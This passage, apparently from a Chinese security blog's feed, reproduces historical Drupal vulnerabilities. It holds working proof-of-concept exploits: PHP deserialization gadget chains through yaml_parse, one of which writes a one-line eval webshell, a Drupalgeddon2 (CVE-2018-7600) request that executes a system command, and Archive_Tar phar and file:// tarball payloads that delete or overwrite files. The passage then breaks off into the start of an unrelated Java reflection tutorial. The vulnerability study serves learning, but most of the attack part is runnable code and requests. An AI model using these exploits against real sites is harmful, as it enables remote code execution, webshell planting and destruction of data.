&quot;O:24:\&quot;GuzzleHttp\\Psr7\\FnStream\&quot;:2:&#123;s:33:\&quot;\0GuzzleHttp\\Psr7\\FnStream\0methods\&quot;;a:1:&#123;s:5:\&quot;close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;s:9:\&quot;_fn_close\&quot;;s:7:\&quot;phpinfo\&quot;;&#125;&quot;</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202130726.png" alt=""></p></li></ol><p>成功执行phpinfo</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202133316.png" alt=""></p><h3 id="漏洞分析-v2">漏洞分析</h3><p>查看官方的commit记录可以发现漏洞的触发点：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202133822.png" alt=""></p><p>可以看到8.3.4版本的decode函数新增了一段代码，其作用主要就是改变PHP配置文件中的<code>yaml.decode_php=0</code>，那么我们就跟进这个文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134115.png" alt=""></p><p>漏洞所在函数<code>decode</code>的触发点代码就是上图中调用<code>yaml_parse</code>这个函数，其中<code>$raw</code>参数直接被带入<code>yaml_parse</code>函数中，看一下官方文档对于这个函数的描述：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134255.png" alt=""></p><p>第一个参数是需要parse成yaml的文档流，并且这个参数是从这个函数外部输入的。另外，在官方文档的下方有一个对这个函数的特别说明：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202134439.png" alt=""></p><p>意思就是如果使用了<code>!php/object</code>tag，yaml_parse会对第一个参数调用unserialize()，如果要禁止这样做，就通过设置<code>yaml.decode_php</code>来处理，这就是官方补丁在<code>decode</code>函数前面加的那几行代码。</p><p>因此，这个远程代码执行漏洞的罪魁祸首就是<code>yaml_parse</code>函数可能会用反序列化的形式来处理输入的字符串，从而导致通过反序列化类的方式来操作一些危险类，最终实现代码执行。</p><p>那么控制decode函数的参数<code>$raw</code>就可以出发这个漏洞。回溯定位<code>decode</code>函数的调用位置，在<code>core/lib/Drupal/Component/Serialization/Yaml.php</code>文件中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202135144.png" alt=""></p><p>在第34行该函数调用了getSerializer函数，跟进到第48行，首先判断是否存在yaml扩展，如果存在的话就使用<code>YamlPecl</code>类，然后调用这个类中的<code>decode</code>函数，也就是会调用<code>yaml_parse</code>函数。</p><p>继续回溯调用<code>Yaml::decode</code>函数的地方，全局查找一共有36处地方：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202140845.png" alt=""></p><p>其中外部可控的地方只有一处，位于<code>ConfigSingleImportForm.php</code>文件中。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202141142.png" alt=""></p><p>这里对外部输入的import值进行<code>Yaml::decode</code>操作，那么这就是漏洞的数据触发点。</p><p>既然是反序列化，那么就需要找到一个可以反序列化的类。全局搜索<code>__destruct</code>或<code>__wakeup</code>关键字，一般而言<code>__destruct</code>更容易利用。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202141427.png" alt=""></p><ol><li><p><code>/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202143842.png" alt=""></p><p>通过反序列化这个类可以造成写入webshell，但是利用过程相比后面两个而言更为麻烦一点。PHPGGC已经包含了这个gadget，拿过来稍微改一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Cookie</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">SetCookie</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;data = [</span><br><span class="line">        <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;ca01h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Value&#x27;</span> =&gt; <span class="string">&#x27;ca01h&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Expires&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">&#x27;Discard&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&#x27;Domain&#x27;</span> =&gt; $data</span><br><span class="line">      ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">CookieJar</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $cookies = [];</span><br><span class="line">    <span class="keyword">private</span> $strictMode;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;cookies = [<span class="keyword">new</span> SetCookie($data)];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">FileCookieJar</span> <span class="keyword">extends</span> <span class="title">CookieJar</span></span></span><br><span class="line"><span class="class">  </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $filename;</span><br><span class="line">    <span class="keyword">private</span> $storeSessionCookies = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$filename, $data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="built_in">parent</span>::__construct($data);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $new = <span class="keyword">new</span> FileCookieJar(<span class="string">&#x27;/Users/ca01h/Desktop/shell.php&#x27;</span>, <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;!php/object &#x27;</span> . <span class="string">&#x27;&quot;&#x27;</span> . addslashes(serialize($new)) . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>/vendor/symfony/process/Pipes/WindowsPipes.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161528.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161558.png" alt=""></p><p>反序列化这个类可以造成任意文件删除。</p></li><li><p><code>/vendor/guzzlehttp/psr7/src/FnStream.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202161812.png" alt=""></p><p>反序列化这个类可以实现无参数RCE。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">FnStream</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title">private</span> $<span class="title">methods</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">array</span> $methods</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;methods = $methods;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Create the functions on the class</span></span><br><span class="line">      <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $name =&gt; $fn) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;&#123;<span class="string">&#x27;_fn_&#x27;</span> . $name&#125; = $fn;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $new = <span class="keyword">new</span> FnStream(<span class="keyword">array</span>(<span class="string">&quot;close&quot;</span> =&gt; <span class="string">&quot;phpinfo()&quot;</span>));</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;!php/object &#x27;</span> . <span class="string">&#x27;&quot;&#x27;</span> . addslashes(serialize($new)) . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="CVE-2018-7600-远程命令执行漏洞">CVE-2018-7600 远程命令执行漏洞</h2><h3 id="影响版本-v3">影响版本</h3><p>Drupal 7 &lt; 7.58</p><p>Drupal 8.3.x &lt; 8.3.9</p><p>Drupal 8.4.x &lt; 8.4.6</p><p>Drupal 8.5.x &lt; 8.5.1</p><h3 id="环境安装-v3">环境安装</h3><p>从官网中下载Durpal 8.5.0版本的源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.drupal.org&#x2F;project&#x2F;drupal&#x2F;releases&#x2F;8.5.0</span><br></pre></td></tr></table></figure><p>使用MAMP Pro搭建，成功安装后，在不登录的情况下发送如下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;user&#x2F;register?element_parents&#x3D;account&#x2F;mail&#x2F;%23value&amp;ajax_form&#x3D;1&amp;_wrapper_format&#x3D;drupal_ajax HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 103</span><br><span class="line"></span><br><span class="line">form_id&#x3D;user_register_form&amp;_drupal_ajax&#x3D;1&amp;mail[#post_render][]&#x3D;exec&amp;mail[#type]&#x3D;markup&amp;mail[#markup]&#x3D;id</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201202210038.png" alt=""></p><h3 id="漏洞分析-v3">漏洞分析</h3><p><a href="https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/">https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/</a></p><p><a href="http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/">http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/</a></p><p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p><h2 id="CVE-2018-7602-远程命令执行漏洞">CVE-2018-7602 远程命令执行漏洞</h2><p><a href="http://blog.nsfocus.net/cve-2018-7602-drupal/">http://blog.nsfocus.net/cve-2018-7602-drupal/</a></p><h2 id="CVE-2019-6339-远程代码执行漏洞">CVE-2019-6339 远程代码执行漏洞</h2><p><a href="https://paper.seebug.org/897/">https://paper.seebug.org/897/</a></p><h2 id="CVE-2019-6341-1-click-XSS">CVE-2019-6341 1-click XSS</h2><h2 id="CVE-2020-28948-28949-远程代码执行漏洞-任意文件覆盖漏洞">CVE-2020-28948/28949 远程代码执行漏洞/任意文件覆盖漏洞</h2><h3 id="影响版本-v4">影响版本</h3><p>Drupal 9 &lt; 9.0.9</p><p>Drupal 8.9 &lt; 8.9.10</p><p>Drupal 8.8 &lt; 8.8.12</p><p>Drupal 8.x (x≠8)</p><p>Drupal 7 &lt; 7.75</p><h3 id="漏洞分析-v4">漏洞分析</h3><p>先查看Drupal官方发的漏洞通报：</p><p><a href="https://www.drupal.org/sa-core-2020-013">https://www.drupal.org/sa-core-2020-013</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209143410.png" alt=""></p><p>通报中提到，Drupal使用了Archive_Tar第三方PEAR组件，而这个组件最近发布了一版安全更新，那么就先去官方仓库上看看Drupal是怎么修复这个漏洞的。以Drupal 8.9版本为例：</p><p><a href="https://git.drupalcode.org/project/drupal/-/commit/1a9383ed9010af01608a5481ad443eb72c1bea7e">https://git.drupalcode.org/project/drupal/-/commit/1a9383ed9010af01608a5481ad443eb72c1bea7e</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209144007.png" alt=""></p><p>可以很明显的看到，Drupal将Archive_tar的版本从1.4.9升级到1.4.11。所以这个漏洞的源头并不是Drupal代码出了问题，而是第三方组件Archive_tar存在缺陷。那我们就主要分析一下Archive_tar的漏洞成因，同样的，去这个组件的GitHub仓库看两个版本的差异点。</p><p><a href="https://github.com/pear/Archive_Tar/compare/1.4.9...1.4.11">https://github.com/pear/Archive_Tar/compare/1.4.9...1.4.11</a></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209144432.png" alt=""></p><p>左边是1.4.9版本的代码，右边是1.4.11版本的代码，漏洞的源头就是在于<code>_maliciousFilename</code>函数中。</p><p>作者为了防止反序列化漏洞，过滤了<code>phar://</code>关键字，但明显strpos这种简单的过滤还是太年轻了，可以很容易地用大写来绕过<code>PHAR://exploit.phar</code>，从而导致反序列化漏洞的产生，这就是CVE-2020-28948漏洞的根源。同样CVE-2020-28949漏洞的根源也在这个地方，我们可以使用<code>file://path/to/file/to/be/overwritten</code>协议作为文件名，从而导致文件覆盖的漏洞。</p><p>Archive_tar组件也很简单，就一个PHP文件，具体的漏洞成因我们审计这一个文件即可。</p><p>一共也就两个地方用到了<code>_maliciousfilename</code>这个函数，一个是<code>_readHeader</code>函数，另一个是<code>_readLongHeader</code>函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209150851.png" alt=""></p><p>而从上图可以看到，在<code>_readLongHeader</code>函数中，还是调用了<code>_readHeader</code>函数，所以我们主要分析<code>_readHeader</code>这个函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209152216.png" alt=""></p><p>这个函数比较长，但是通读下来，发现就做了一件事情，读取压缩文件的头部信息，这些信息包括<code>checksum</code>、<code>property</code>，其中<code>property</code>包含了<code>filename</code>、<code>mode</code>、<code>uid</code>、<code>gid</code>、<code>size</code>等等字段，将这些信息存储在<code>$v_header</code>中并返回到上一级函数，那么我们就进行回溯工作，看有哪些地方调用了<code>_readHeader</code>这个函数。</p><p>全局查找后，发现一共有三个地方，分别是<code>_readLongHeader</code>、<code>_extractList</code>和<code>_extractInString</code>，后两个函数对比一下就可以发现，<code>_extractList</code>是一个较为完整的解压缩过程，那从这里开始分析肯定是没错的。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201209153149.png" alt=""></p><p>在1989行调用了<code>readHeader</code>函数，在我们跟踪<code>$v_header['filename']</code>参数之前，由于函数传参较多，而且参数会很大程度上影响程序流程，所以我们调研一下Archive_tar组件使用方法后发现，解压缩主要是用到<code>extract</code>这个函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143209.png" alt=""></p><p>继续跟进<code>extractModify</code>函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143245.png" alt=""></p><p>在574行调用了<code>_extractList</code>函数，进入上述所说的实质性解压操作。</p><p>根据上图的参数，正常程序流程会进入到2049行的if语句中，并且不会进入到2050行和2062行的if语句中。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210143940.png" alt=""></p><p>接下来在执行2075行的if语句时，调用了<code>file_exsits</code>函数，参数是原本<code>$v_header['filename']</code>的值，此时如果这个值是<code>PHAR://exploit.phar</code>，并且当前文件夹上传了expliot.phar文件，那么就会触发反序列化漏洞。</p><p>既然是反序列化操作，那么就需要全局搜索<code>__destruct</code>或者<code>__wakeup</code>函数。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210144655.png" alt=""></p><p>全局搜索析构函数后，继续跟进<code>_close</code>函数</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210144758.png" alt=""></p><p>在该函数的最后一部分，当<code>_temp_tarname</code>不为空的时候，会调用<code>unlink</code>删除文件函数，那么这个地方就可以触发任意文件删除的漏洞了。</p><p>分析完漏洞成因后，接下来就是编写漏洞利用的脚本了。首先新建一个<code>ca01h_test</code>的文件，内容随意，接下来编写生成Phar文件的PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Archive_Tar</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $_temp_tarname;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$_temp_tarname</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_temp_tarname = $_temp_tarname;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line">$tar = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;ca01h_test&#x27;</span>);</span><br><span class="line">$phar-&gt;setMetadata($tar);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>然后再编写python脚本生成一个压缩文件，其中被压缩的文件名是<code>PHAR://exploit.phar</code>，input_file.txt文件内容随意：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line">tar = tarfile.open(<span class="string">&#x27;exploit.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;input_file.txt&#x27;</span>, <span class="string">&#x27;PHAR://exploit.phar&#x27;</span>)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure><p>最后编写触发漏洞的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&#x27;../Archive/Tar.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  $archive = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;exploit.tar&#x27;</span>);</span><br><span class="line">  $archive-&gt;extract();</span><br></pre></td></tr></table></figure><p>运行上面代码后，可以发现<code>ca01h_test</code>文件被删除。</p><p>接下来再讨论一下CVE-2020-28948，产生漏洞的原因同时是因为过滤不严，只是触发漏洞的位置不一样而言。<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210152508.png" alt=""></p><p>程序在第2151行或2158行调用了<code>fwrite</code>函数，将从压缩文件读出来的文件内容写入到<code>$v_header[filename]</code>文件中，那么这个地方就可能造成任意文件覆盖的漏洞。流程如下：</p><p>首先生成一个测试文件，内容随意：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt; /tmp/target_file</span><br></pre></td></tr></table></figure><p>再用python脚本生成带有恶意payload文件名的压缩文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line">tar = tarfile.open(<span class="string">&#x27;exploit.tar&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">tar.add(<span class="string">&#x27;input_file.txt&#x27;</span>, <span class="string">&#x27;file:///tmp/target_file&#x27;</span>)</span><br><span class="line">tar.close()</span><br></pre></td></tr></table></figure><p>最后执行同样的漏洞触发代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">require_once</span>(<span class="string">&#x27;../Archive/Tar.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  $archive = <span class="keyword">new</span> Archive_Tar(<span class="string">&#x27;exploit.tar&#x27;</span>);</span><br><span class="line">  $archive-&gt;extract();</span><br></pre></td></tr></table></figure><h2 id="参考">参考</h2><p><a href="https://github.com/vulhub/vulhub/tree/master/drupal">https://github.com/vulhub/vulhub/tree/master/drupal</a></p><p><a href="https://paper.seebug.org/334/">https://paper.seebug.org/334/</a></p><p><a href="http://blog.topsec.com.cn/%e5%85%b3%e4%ba%8edrupal8%e7%b3%bb%e5%88%97%e6%a1%86%e6%9e%b6%e5%92%8c%e6%bc%8f%e6%b4%9e%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95%e6%b7%b1%e5%85%a5%e5%88%86%e6%9e%90/">http://blog.topsec.com.cn/关于drupal8系列框架和漏洞动态调试深入分析/</a></p><p><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://kylingit.com/blog/由phpggc理解php反序列化漏洞/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Durpal历史漏洞复现记录&quot;&gt;Durpal历史漏洞复现记录&lt;/h1&gt;
&lt;p&gt;在具体分析Drupal的历史漏洞之前，可能需要先大致了解一下Durpal的整个工作流程，这里推荐三篇文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/u
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Java基础学习之反射和注解</title>
    <link href="http://ca0y1h.top/Java/code/5.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8C%E6%B3%A8%E8%A7%A3/"/>
    <id>http://ca0y1h.top/Java/code/5.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84%E5%92%8C%E6%B3%A8%E8%A7%A3/</id>
    <published>2021-01-22T13:31:59.000Z</published>
    <updated>2021-01-22T13:33:08.244Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础学习之反射和注解">Java基础学习之反射和注解</h1><p>Reference: <a href="https://liaoxuefeng.com">https://liaoxuefeng.com</a></p><h2 id="0x01-反射">0x01 反射</h2><h3 id="Class类">Class类</h3><p>JVM每加载一种<code>class</code>，就为其创建一个<code>Class</code>实例，并关联起来。注意：这里的<code>Class</code>类型是一个名叫<code>Class</code>的<code>class</code>，形如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Class</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以String类为例，当JVM加载String类的时候，首先会读取<code>String.class</code>到内存，然后，为<code>String</code>类创建一个<code>Class</code>实例并关联起来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls = <span class="keyword">new</span> Class(String);</span><br></pre></td></tr></table></figure><p>JVM持有的每个<code>Class</code>实例都指向一个数据类型（<code>class</code>或<code>interface</code>）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; String</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.String&quot;  │</span><br><span class="line">└───────────────────────────┘</span><br><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; Random</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.util.Random&quot;  │</span><br><span class="line">└───────────────────────────┘</span><br><span class="line">┌───────────────────────────┐</span><br><span class="line">│      Class Instance       │──────&gt; Runnable</span><br><span class="line">├───────────────────────────┤</span><br><span class="line">│name &#x3D; &quot;java.lang.Runnable&quot;│</span><br><span class="line">└───────────────────────────┘</span><br></pre></td></tr></table></figure><p>一个<code>Class</code>实例包含了该<code>class</code>的所有完整信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 